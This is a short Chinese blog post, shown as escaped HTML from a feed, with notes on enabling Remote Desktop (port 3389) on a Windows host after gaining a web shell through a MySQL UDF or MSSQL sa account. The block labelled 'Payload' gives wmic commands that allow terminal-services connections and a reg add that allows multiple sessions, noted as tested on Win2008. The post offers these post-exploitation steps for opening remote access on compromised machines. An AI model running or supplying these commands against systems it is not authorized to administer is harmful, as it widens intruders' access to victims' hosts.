    <content type="html">&lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h2&gt;&lt;p&gt;在一些拿到web权限的时候，windows主机没有开放3389，在shell(eg. mysql udf or mssql sa)下利用命令开3389的记录&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Payload&quot;&gt;&lt;a href=&quot;#Payload&quot; class=&quot;headerlink&quot; title=&quot;Payload&quot;&gt;&lt;/a&gt;Payload&lt;/h3&gt;&lt;figure class=&quot;highlight cmd&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;.wmic /namespace:\\root\cimv2\terminalservices &lt;span class=&quot;built_in&quot;&gt;path&lt;/span&gt; win32_terminalservicesetting where (__CLASS != &quot;&quot;) &lt;span class=&quot;keyword&quot;&gt;call&lt;/span&gt; setallowtsconnections &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;.wmic /namespace:\\root\cimv2\terminalservices &lt;span class=&quot;built_in&quot;&gt;path&lt;/span&gt; win32_tsgeneralsetting where (TerminalName =&#39;RDP-Tcp&#39;) &lt;span class=&quot;keyword&quot;&gt;call&lt;/span&gt; setuserauthenticationrequired &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;.reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; /f&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#win08,win7,&lt;span class=&quot;number&quot;&gt;12&lt;/span&gt; win08测试成功&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
